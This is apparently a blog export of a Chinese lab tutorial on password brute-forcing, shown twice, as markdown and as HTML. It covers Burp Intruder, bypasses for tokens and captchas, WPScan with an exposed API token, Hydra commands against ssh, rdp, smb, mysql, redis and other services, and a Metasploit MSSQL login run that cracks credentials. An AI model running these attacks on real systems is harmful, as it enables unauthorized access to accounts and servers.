run\n\n[*] 192.168.31.57:1433    - 192.168.31.57:1433 - MSSQL - Starting authentication scanner.\n[!] 192.168.31.57:1433    - No active DB -- Credential data will not be saved!\n[-] 192.168.31.57:1433    - 192.168.31.57:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )\n[+] 192.168.31.57:1433    - 192.168.31.57:1433 - Login Successful: WORKSTATION\\sa:123456\n[*] 192.168.31.57:1433    - Scanned 1 of 1 hosts (100% complete)\n[*] 192.168.31.57:1433    - Bruteforce completed, 1 credential was successful.\n[*] 192.168.31.57:1433    - You can open an MSSQL session with these credentials and CreateSession set to true\n[*] Auxiliary module execution completed\n```\n\n","source":"_posts/穷举.md","raw":"---\ntitle: 穷举\nhide: false\ndate: 2025-03-12 21:35:26\ntags:\n  - 网络安全\n---\n\n\n\n> 本文出现域名均为搭建的本地靶场域名\n\n## 1 概述\n\n​\t穷举就是枚举的意思，在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为，弱口令、中度口令、强度口令。如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举弱口令对服务进行攻击，很容易就得到登录密码。得到密码之后就能登录服务，进行其他危害较大得操作。黑客也能通过对用户得信息整理，组合密码进行穷举攻击。例如根据用户的生日号码，出身年月日和姓名进行口令组合，再对其服务进行穷举。\n\n**常见服务**\n\n| 服务                    | 端口  |\n| ----------------------- | ----- |\n| web                     | 80    |\n| mysql                   | 3306  |\n| Microsoft SQL Server    | 1433  |\n| https                   | 443   |\n| ftp                     | 21    |\n| ssh                     | 22    |\n| dns                     | 53    |\n| tomcat                  | 8080  |\n| redis                   | 6379  |\n| rsync                   | 873   |\n| PostgreSQL              | 5432  |\n| cobaltstrike teamserver | 50050 |\n| smtp                    | 25    |\n| pop3                    | 110   |\n| 远程终端rdp             | 3389  |\n| smb                     | 445   |\n| rpc                     | 135   |\n| imap                    | 143   |\n| NetBIOS                 | 139   |\n| SMTPS                   | 465   |\n| POP3S                   | 995   |\n| mogodb                  | 27018 |\n| memcached               | 11211 |\n| telnet                  | 23    |\n| oracle                  | 1521  |\n\n\n\n## 2 burpsuite穷举后台密码\n\n抓包，然后放到Intruder模块，添加payload位置\n\n![image-20250312225424438](穷举/image-20250312225424438.png)\n\n加载payloads\n\n![image-20250312225451754](穷举/image-20250312225451754.png)\n\n开始攻击，爆破出密码\n\n![image-20250312225540034](穷举/image-20250312225540034.png)\n\n成功登录后台\n\n![image-20250312225644180](穷举/image-20250312225644180.png)\n\n\n\n## 3 带有Token防御的穷举爆破\n\n有的网站存在一次性Token，再用过一次后就失效了，导致没办法爆破\n\n![image-20250312230827144](穷举/image-20250312230827144.png)\n\n这里可以使用burpsuite的宏设置，打开`Settings`中的`Session`。\n\n![image-20250312231604753](穷举/image-20250312231604753.png)\n\n添加规则，选择运行宏。\n\n![image-20250312231626743](穷举/image-20250312231626743.png)\n\n选择添加宏\n\n![image-20250312231721421](穷举/image-20250312231721421.png)\n\n这里选择包含Token的响应\n\n![image-20250312231837586](穷举/image-20250312231837586.png)\n\n选择项目设置，在自定义参数位置添加，选择要获取的参数，这里要注意**参数名一定要一致**\n\n![image-20250312232023480](穷举/image-20250312232023480.png)\n\n一通确认，将更改参数名设置一下\n\n![image-20250312232151766](穷举/image-20250312232151766.png)\n\n可以更改一下作用范围\n\n![image-20250312232336232](穷举/image-20250312232336232.png)\n\n然后就可以开始爆破了，不过还是会有一些几率替换失败，感觉是爆破线程过高的原因，调低线程以后爆破成功了。\n\n![image-20250312233222030](穷举/image-20250312233222030.png)\n\n\n## 4 针对有验证码的穷举爆破\n\n### 4.1 Cookie不存在不验证绕过\n\n在请求包Cookie中存在字段`PHPSESSID`\n\n![image-20250312234452887](穷举/image-20250312234452887.png)\n\n其值其实对应于一个文件\n\n![image-20250312234548755](穷举/image-20250312234548755.png)\n\n这里如果对其没有验证，则可以删除`PHPSESSID`实现绕过，爆破成功\n\n![image-20250312234722354](穷举/image-20250312234722354.png)\n\n![image-20250312234834804](穷举/image-20250312234834804.png)\n\n### 4.2 后台验证码不销毁绕过\n\n有的网站验证码在使用后不会销毁，可以复用，达到绕过\n\n![image-20250312235311801](穷举/image-20250312235311801.png)\n\n![image-20250312235427207](穷举/image-20250312235427207.png)\n\n### 4.3 验证码识别爆破\n\n使用验证码识别工具，直接识别出验证码值，进行爆破\n\n![image-20250313000046133](穷举/image-20250313000046133.png)\n\n这里正常抓包，添加爆破位置，添加验证码路径，载入字典即可，在载入字典时需修改`Line Endings`为`Windows`，不然字典导不进去\n\n![image-20250313000648523](穷举/image-20250313000648523.png)\n\n![image-20250313001039560](穷举/image-20250313001039560.png)\n\n填写验证码错误信息，即可开始爆破\n\n![image-20250313001105420](穷举/image-20250313001105420.png)\n\n\n\n## 5 一些常见软件登录穷举\n\n### 5.1 phpmyadmin\n\n通常爆破`admin`，`root`，`test`用户密码\n\n![image-20250317212314918](穷举/image-20250317212314918.png)\n\n[下载地址](https://bbs.kanxue.com/thread-159062.htm)\n\n\n\n### 5.2 WordPress\n\n可以拼接路径，查看账户信息`/wp-json/wp/v2/users`\n\n![image-20250317215045138](穷举/image-20250317215045138.png)\n\n使用`WPScan`工具，首先在[WPScan](https://wpscan.com/)注册账户获取`token`，使用以下命令\n\n```bash\n$ wpscan --url http://xxx.com -e u -P ./top1000.txt --api-token 6qGDsJorRIvSazNIg9s4mwjxX8nOUPRL3to6fdJgwoo\n```\n\n![image-20250317215215191](穷举/image-20250317215215191.png)\n\n## 6 hydra工具使用\n\n```bash\n-l login 小写，指定用户名进行破解\n-L file 大写，指定用户的用户名字典\n-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。\n-P file 大写，用于指定密码字典。\n-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探\n-M file 指定目标ip列表文件，批量破解。\n-o file 指定结果输出文件\n-f 找到第一对登录名或者密码的时候中止破解。\n-t tasks 同时运行的线程数，默认是16\n-w time 设置最大超时时间，单位\n-v / -V 显示详细过程\n-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）\n-x 自定义密码\n```\n\n\n\n### 6.1 ssh\n\n**配置Ubuntu root用户ssh登录**\n\n```bash\n$ sudo apt install openssh-server # 安装ssh\n$ sudo nano /etc/ssh/sshd_config\n# PermitRootLogin prohibit-password ——> PermitRootLogin yes\n$ sudo service ssh restart # 重启ssh服务\n```\n\n使用`hydra`对ssh密码进行爆破\n\n```bash\n$ hydra -l root -P ./top500.txt -e ns -vV -t 1 -f 192.168.31.50 ssh\n```\n\n![image-20250317232800500](穷举/image-20250317232800500.png)\n\n### 6.2 ftp\n\n```bash\n$ hydra -l c5moon -P ./top500.txt -e ns -vV 192.168.31.51 ftp\n```\n\n![image-20250317233427264](穷举/image-20250317233427264.png)\n\n### 6.3 mysql\n\n```bash\n$ hydra -l root -P ./top500.txt -e ns -vV -f 192.168.31.57 mysql\n```\n\n![image-20250317233635882](穷举/image-20250317233635882.png)\n\n### 6.4 smb\n\n```bash\n$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 smb\n```\n\n![image-20250317234038917](穷举/image-20250317234038917.png)\n\n### 6.5 rdp\n\n```bash\n$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 rdp\n```\n\n![image-20250317234329708](穷举/image-20250317234329708.png)\n\n### 6.6 http\n\n```bash\n$ hydra -l admin -P ./top500.txt -vV -f www.c1moon.com http-post-form \"/admin/index.php:user=^USER^&ps=^PASS^&action=login:login-error\"\n```\n\n![image-20250317235246581](穷举/image-20250317235246581.png)\n\n### 6.7 mssql\n\n```bash\n$ hydra -l sa -P ./top500.txt -e ns -vV -f 192.168.31.57 mssql\n```\n\n![image-20250317235614010](穷举/image-20250317235614010.png)\n\n### 6.8 redis\n\n```bash\n$ hydra -P ./top500.txt -e ns -vV -f 192.168.31.57 redis\n```\n\n![image-20250317235842515](穷举/image-20250317235842515.png)\n\n## 7 metasploite穷举模块\n\n```bash\n$ msfconsole # 启动msf\n\nmsf6 > search auxiliary/scanner/mssql/mssql_login # 搜索模块\n\nMatching Modules\n================\n\n   #  Name                                 Disclosure Date  Rank    Check  Description\n   -  ----                                 ---------------  ----    -----  -----------\n   0  auxiliary/scanner/mssql/mssql_login  .                normal  No     MSSQL Login Utility\n\n\nInteract with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mssql/mssql_login\n\nmsf6 > use auxiliary/scanner/mssql/mssql_login # 使用模块\n[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session\n\nmsf6 auxiliary(scanner/mssql/mssql_login) > info # 查看模块信息\n```\n\n![image-20250318000514529](穷举/image-20250318000514529.png)\n\n```bash\nmsf6 auxiliary(scanner/mssql/mssql_login) > show options # 显示参数\n```\n\n![image-20250318001134113](穷举/image-20250318001134113.png)\n\n```bash\nmsf6 auxiliary(scanner/mssql/mssql_login) > set RHOSTS 192.168.31.57\nRHOSTS => 192.168.31.57\nmsf6 auxiliary(scanner/mssql/mssql_login) > set STOP_ON_SUCCESS true\nSTOP_ON_SUCCESS => true\nmsf6 auxiliary(scanner/mssql/mssql_login) > set PASS_FILE ./top500.txt\nPASS_FILE => ./top500.txt\nmsf6 auxiliary(scanner/mssql/mssql_login) > run\n\n[*] 192.168.31.57:1433    - 192.168.31.57:1433 - MSSQL - Starting authentication scanner.\n[!] 192.168.31.57:1433    - No active DB -- Credential data will not be saved!\n[-] 192.168.31.57:1433    - 192.168.31.57:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )\n[+] 192.168.31.57:1433    - 192.168.31.57:1433 - Login Successful: WORKSTATION\\sa:123456\n[*] 192.168.31.57:1433    - Scanned 1 of 1 hosts (100% complete)\n[*] 192.168.31.57:1433    - Bruteforce completed, 1 credential was successful.\n[*] 192.168.31.57:1433    - You can open an MSSQL session with these credentials and CreateSession set to true\n[*] Auxiliary module execution completed\n```\n\n","slug":"穷举","published":1,"updated":"2025-03-17T16:12:06.340Z","comments":1,"layout":"post","photos":[],"_id":"cm8d9pkhu000blsjf420z4e8z","content":"<blockquote>\n<p>本文出现域名均为搭建的本地靶场域名</p>\n</blockquote>\n<h2 id=\"1-概述\"><a href=\"#1-概述\" class=\"headerlink\" title=\"1 概述\"></a>1 概述</h2><p>​\t穷举就是枚举的意思，在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为，弱口令、中度口令、强度口令。如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举弱口令对服务进行攻击，很容易就得到登录密码。得到密码之后就能登录服务，进行其他危害较大得操作。黑客也能通过对用户得信息整理，组合密码进行穷举攻击。例如根据用户的生日号码，出身年月日和姓名进行口令组合，再对其服务进行穷举。</p>\n<p><strong>常见服务</strong></p>\n<table>\n<thead>\n<tr>\n<th>服务</th>\n<th>端口</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>web</td>\n<td>80</td>\n</tr>\n<tr>\n<td>mysql</td>\n<td>3306</td>\n</tr>\n<tr>\n<td>Microsoft SQL Server</td>\n<td>1433</td>\n</tr>\n<tr>\n<td>https</td>\n<td>443</td>\n</tr>\n<tr>\n<td>ftp</td>\n<td>21</td>\n</tr>\n<tr>\n<td>ssh</td>\n<td>22</td>\n</tr>\n<tr>\n<td>dns</td>\n<td>53</td>\n</tr>\n<tr>\n<td>tomcat</td>\n<td>8080</td>\n</tr>\n<tr>\n<td>redis</td>\n<td>6379</td>\n</tr>\n<tr>\n<td>rsync</td>\n<td>873</td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td>5432</td>\n</tr>\n<tr>\n<td>cobaltstrike teamserver</td>\n<td>50050</td>\n</tr>\n<tr>\n<td>smtp</td>\n<td>25</td>\n</tr>\n<tr>\n<td>pop3</td>\n<td>110</td>\n</tr>\n<tr>\n<td>远程终端rdp</td>\n<td>3389</td>\n</tr>\n<tr>\n<td>smb</td>\n<td>445</td>\n</tr>\n<tr>\n<td>rpc</td>\n<td>135</td>\n</tr>\n<tr>\n<td>imap</td>\n<td>143</td>\n</tr>\n<tr>\n<td>NetBIOS</td>\n<td>139</td>\n</tr>\n<tr>\n<td>SMTPS</td>\n<td>465</td>\n</tr>\n<tr>\n<td>POP3S</td>\n<td>995</td>\n</tr>\n<tr>\n<td>mogodb</td>\n<td>27018</td>\n</tr>\n<tr>\n<td>memcached</td>\n<td>11211</td>\n</tr>\n<tr>\n<td>telnet</td>\n<td>23</td>\n</tr>\n<tr>\n<td>oracle</td>\n<td>1521</td>\n</tr>\n</tbody></table>\n<h2 id=\"2-burpsuite穷举后台密码\"><a href=\"#2-burpsuite穷举后台密码\" class=\"headerlink\" title=\"2 burpsuite穷举后台密码\"></a>2 burpsuite穷举后台密码</h2><p>抓包，然后放到Intruder模块，添加payload位置</p>\n<img src=\"/posts/undefined/image-20250312225424438.png\" class=\"\" title=\"image-20250312225424438\">\n\n<p>加载payloads</p>\n<img src=\"/posts/undefined/image-20250312225451754.png\" class=\"\" title=\"image-20250312225451754\">\n\n<p>开始攻击，爆破出密码</p>\n<img src=\"/posts/undefined/image-20250312225540034.png\" class=\"\" title=\"image-20250312225540034\">\n\n<p>成功登录后台</p>\n<img src=\"/posts/undefined/image-20250312225644180.png\" class=\"\" title=\"image-20250312225644180\">\n\n\n\n<h2 id=\"3-带有Token防御的穷举爆破\"><a href=\"#3-带有Token防御的穷举爆破\" class=\"headerlink\" title=\"3 带有Token防御的穷举爆破\"></a>3 带有Token防御的穷举爆破</h2><p>有的网站存在一次性Token，再用过一次后就失效了，导致没办法爆破</p>\n<img src=\"/posts/undefined/image-20250312230827144.png\" class=\"\" title=\"image-20250312230827144\">\n\n<p>这里可以使用burpsuite的宏设置，打开<code>Settings</code>中的<code>Session</code>。</p>\n<img src=\"/posts/undefined/image-20250312231604753.png\" class=\"\" title=\"image-20250312231604753\">\n\n<p>添加规则，选择运行宏。</p>\n<img src=\"/posts/undefined/image-20250312231626743.png\" class=\"\" title=\"image-20250312231626743\">\n\n<p>选择添加宏</p>\n<img src=\"/posts/undefined/image-20250312231721421.png\" class=\"\" title=\"image-20250312231721421\">\n\n<p>这里选择包含Token的响应</p>\n<img src=\"/posts/undefined/image-20250312231837586.png\" class=\"\" title=\"image-20250312231837586\">\n\n<p>选择项目设置，在自定义参数位置添加，选择要获取的参数，这里要注意<strong>参数名一定要一致</strong></p>\n<img src=\"/posts/undefined/image-20250312232023480.png\" class=\"\" title=\"image-20250312232023480\">\n\n<p>一通确认，将更改参数名设置一下</p>\n<img src=\"/posts/undefined/image-20250312232151766.png\" class=\"\" title=\"image-20250312232151766\">\n\n<p>可以更改一下作用范围</p>\n<img src=\"/posts/undefined/image-20250312232336232.png\" class=\"\" title=\"image-20250312232336232\">\n\n<p>然后就可以开始爆破了，不过还是会有一些几率替换失败，感觉是爆破线程过高的原因，调低线程以后爆破成功了。</p>\n<img src=\"/posts/undefined/image-20250312233222030.png\" class=\"\" title=\"image-20250312233222030\">\n\n\n<h2 id=\"4-针对有验证码的穷举爆破\"><a href=\"#4-针对有验证码的穷举爆破\" class=\"headerlink\" title=\"4 针对有验证码的穷举爆破\"></a>4 针对有验证码的穷举爆破</h2><h3 id=\"4-1-Cookie不存在不验证绕过\"><a href=\"#4-1-Cookie不存在不验证绕过\" class=\"headerlink\" title=\"4.1 Cookie不存在不验证绕过\"></a>4.1 Cookie不存在不验证绕过</h3><p>在请求包Cookie中存在字段<code>PHPSESSID</code></p>\n<img src=\"/posts/undefined/image-20250312234452887.png\" class=\"\" title=\"image-20250312234452887\">\n\n<p>其值其实对应于一个文件</p>\n<img src=\"/posts/undefined/image-20250312234548755.png\" class=\"\" title=\"image-20250312234548755\">\n\n<p>这里如果对其没有验证，则可以删除<code>PHPSESSID</code>实现绕过，爆破成功</p>\n<img src=\"/posts/undefined/image-20250312234722354.png\" class=\"\" title=\"image-20250312234722354\">\n\n<img src=\"/posts/undefined/image-20250312234834804.png\" class=\"\" title=\"image-20250312234834804\">\n\n<h3 id=\"4-2-后台验证码不销毁绕过\"><a href=\"#4-2-后台验证码不销毁绕过\" class=\"headerlink\" title=\"4.2 后台验证码不销毁绕过\"></a>4.2 后台验证码不销毁绕过</h3><p>有的网站验证码在使用后不会销毁，可以复用，达到绕过</p>\n<img src=\"/posts/undefined/image-20250312235311801.png\" class=\"\" title=\"image-20250312235311801\">\n\n<img src=\"/posts/undefined/image-20250312235427207.png\" class=\"\" title=\"image-20250312235427207\">\n\n<h3 id=\"4-3-验证码识别爆破\"><a href=\"#4-3-验证码识别爆破\" class=\"headerlink\" title=\"4.3 验证码识别爆破\"></a>4.3 验证码识别爆破</h3><p>使用验证码识别工具，直接识别出验证码值，进行爆破</p>\n<img src=\"/posts/undefined/image-20250313000046133.png\" class=\"\" title=\"image-20250313000046133\">\n\n<p>这里正常抓包，添加爆破位置，添加验证码路径，载入字典即可，在载入字典时需修改<code>Line Endings</code>为<code>Windows</code>，不然字典导不进去</p>\n<img src=\"/posts/undefined/image-20250313000648523.png\" class=\"\" title=\"image-20250313000648523\">\n\n<img src=\"/posts/undefined/image-20250313001039560.png\" class=\"\" title=\"image-20250313001039560\">\n\n<p>填写验证码错误信息，即可开始爆破</p>\n<img src=\"/posts/undefined/image-20250313001105420.png\" class=\"\" title=\"image-20250313001105420\">\n\n\n\n<h2 id=\"5-一些常见软件登录穷举\"><a href=\"#5-一些常见软件登录穷举\" class=\"headerlink\" title=\"5 一些常见软件登录穷举\"></a>5 一些常见软件登录穷举</h2><h3 id=\"5-1-phpmyadmin\"><a href=\"#5-1-phpmyadmin\" class=\"headerlink\" title=\"5.1 phpmyadmin\"></a>5.1 phpmyadmin</h3><p>通常爆破<code>admin</code>，<code>root</code>，<code>test</code>用户密码</p>\n<img src=\"/posts/undefined/image-20250317212314918.png\" class=\"\" title=\"image-20250317212314918\">\n\n<p><a href=\"https://bbs.kanxue.com/thread-159062.htm\">下载地址</a></p>\n<h3 id=\"5-2-WordPress\"><a href=\"#5-2-WordPress\" class=\"headerlink\" title=\"5.2 WordPress\"></a>5.2 WordPress</h3><p>可以拼接路径，查看账户信息<code>/wp-json/wp/v2/users</code></p>\n<img src=\"/posts/undefined/image-20250317215045138.png\" class=\"\" title=\"image-20250317215045138\">\n\n<p>使用<code>WPScan</code>工具，首先在<a href=\"https://wpscan.com/\">WPScan</a>注册账户获取<code>token</code>，使用以下命令</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wpscan --url http://xxx.com -e u -P ./top1000.txt --api-token 6qGDsJorRIvSazNIg9s4mwjxX8nOUPRL3to6fdJgwoo</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317215215191.png\" class=\"\" title=\"image-20250317215215191\">\n\n<h2 id=\"6-hydra工具使用\"><a href=\"#6-hydra工具使用\" class=\"headerlink\" title=\"6 hydra工具使用\"></a>6 hydra工具使用</h2><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-l login 小写，指定用户名进行破解</span><br><span class=\"line\">-L file 大写，指定用户的用户名字典</span><br><span class=\"line\">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span><br><span class=\"line\">-P file 大写，用于指定密码字典。</span><br><span class=\"line\">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span><br><span class=\"line\">-M file 指定目标ip列表文件，批量破解。</span><br><span class=\"line\">-o file 指定结果输出文件</span><br><span class=\"line\">-f 找到第一对登录名或者密码的时候中止破解。</span><br><span class=\"line\">-t tasks 同时运行的线程数，默认是16</span><br><span class=\"line\">-w <span class=\"keyword\">time</span> 设置最大超时时间，单位</span><br><span class=\"line\">-v / -V 显示详细过程</span><br><span class=\"line\">-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</span><br><span class=\"line\">-x 自定义密码</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"6-1-ssh\"><a href=\"#6-1-ssh\" class=\"headerlink\" title=\"6.1 ssh\"></a>6.1 ssh</h3><p><strong>配置Ubuntu root用户ssh登录</strong></p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">sudo</span> apt install openssh-server <span class=\"comment\"># 安装ssh</span></span><br><span class=\"line\">$ <span class=\"built_in\">sudo</span> nano /etc/ssh/sshd_config</span><br><span class=\"line\"><span class=\"comment\"># PermitRootLogin prohibit-password ——&gt; PermitRootLogin yes</span></span><br><span class=\"line\">$ <span class=\"built_in\">sudo</span> service ssh restart <span class=\"comment\"># 重启ssh服务</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>使用<code>hydra</code>对ssh密码进行爆破</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l root -P ./top500.txt -e ns -vV -t 1 -f 192.168.31.50 ssh</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317232800500.png\" class=\"\" title=\"image-20250317232800500\">\n\n<h3 id=\"6-2-ftp\"><a href=\"#6-2-ftp\" class=\"headerlink\" title=\"6.2 ftp\"></a>6.2 ftp</h3><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l c5moon -P ./top500.txt -e ns -vV 192.168.31.51 ftp</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317233427264.png\" class=\"\" title=\"image-20250317233427264\">\n\n<h3 id=\"6-3-mysql\"><a href=\"#6-3-mysql\" class=\"headerlink\" title=\"6.3 mysql\"></a>6.3 mysql</h3><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l root -P ./top500.txt -e ns -vV -f 192.168.31.57 mysql</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317233635882.png\" class=\"\" title=\"image-20250317233635882\">\n\n<h3 id=\"6-4-smb\"><a href=\"#6-4-smb\" class=\"headerlink\" title=\"6.4 smb\"></a>6.4 smb</h3><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 smb</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317234038917.png\" class=\"\" title=\"image-20250317234038917\">\n\n<h3 id=\"6-5-rdp\"><a href=\"#6-5-rdp\" class=\"headerlink\" title=\"6.5 rdp\"></a>6.5 rdp</h3><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 rdp</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317234329708.png\" class=\"\" title=\"image-20250317234329708\">\n\n<h3 id=\"6-6-http\"><a href=\"#6-6-http\" class=\"headerlink\" title=\"6.6 http\"></a>6.6 http</h3><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l admin -P ./top500.txt -vV -f www.c1moon.com http-post-form <span class=\"string\">\"/admin/index.php:user=^USER^&amp;ps=^PASS^&amp;action=login:login-error\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317235246581.png\" class=\"\" title=\"image-20250317235246581\">\n\n<h3 id=\"6-7-mssql\"><a href=\"#6-7-mssql\" class=\"headerlink\" title=\"6.7 mssql\"></a>6.7 mssql</h3><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l sa -P ./top500.txt -e ns -vV -f 192.168.31.57 mssql</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317235614010.png\" class=\"\" title=\"image-20250317235614010\">\n\n<h3 id=\"6-8-redis\"><a href=\"#6-8-redis\" class=\"headerlink\" title=\"6.8 redis\"></a>6.8 redis</h3><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -P ./top500.txt -e ns -vV -f 192.168.31.57 redis</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250317235842515.png\" class=\"\" title=\"image-20250317235842515\">\n\n<h2 id=\"7-metasploite穷举模块\"><a href=\"#7-metasploite穷举模块\" class=\"headerlink\" title=\"7 metasploite穷举模块\"></a>7 metasploite穷举模块</h2><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ msfconsole <span class=\"comment\"># 启动msf</span></span><br><span class=\"line\"></span><br><span class=\"line\">msf6 &gt; search auxiliary/scanner/mssql/mssql_login <span class=\"comment\"># 搜索模块</span></span><br><span class=\"line\"></span><br><span class=\"line\">Matching Modules</span><br><span class=\"line\">================</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">#  Name                                 Disclosure Date  Rank    Check  Description</span></span><br><span class=\"line\">   -  ----                                 ---------------  ----    -----  -----------</span><br><span class=\"line\">   0  auxiliary/scanner/mssql/mssql_login  .                normal  No     MSSQL Login Utility</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mssql/mssql_login</span><br><span class=\"line\"></span><br><span class=\"line\">msf6 &gt; use auxiliary/scanner/mssql/mssql_login <span class=\"comment\"># 使用模块</span></span><br><span class=\"line\">[*] New <span class=\"keyword\">in</span> Metasploit 6.4 - The CreateSession option within this module can open an interactive session</span><br><span class=\"line\"></span><br><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; info <span class=\"comment\"># 查看模块信息</span></span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250318000514529.png\" class=\"\" title=\"image-20250318000514529\">\n\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; show options <span class=\"comment\"># 显示参数</span></span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/undefined/image-20250318001134113.png\" class=\"\" title=\"image-20250318001134113\">\n\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class=\"built_in\">set</span> RHOSTS 192.168.31.57</span><br><span class=\"line\">RHOSTS =&gt; 192.168.31.57</span><br><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class=\"built_in\">set</span> STOP_ON_SUCCESS <span class=\"literal\">true</span></span><br><span class=\"line\">STOP_ON_SUCCESS =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class=\"built_in\">set</span> PASS_FILE ./top500.txt</span><br><span class=\"line\">PASS_FILE =&gt; ./top500.txt</span><br><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[*] 192.168.31.57:1433    - 192.168.31.57:1433 - MSSQL - Starting authentication scanner.</span><br><span class=\"line\">[!] 192.168.31.57:1433    - No active DB -- Credential data will not be saved!</span><br><span class=\"line\">[-] 192.168.31.57:1433    - 192.168.31.57:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )</span><br><span class=\"line\">[+] 192.168.31.57:1433    - 192.168.31.57:1433 - Login Successful: 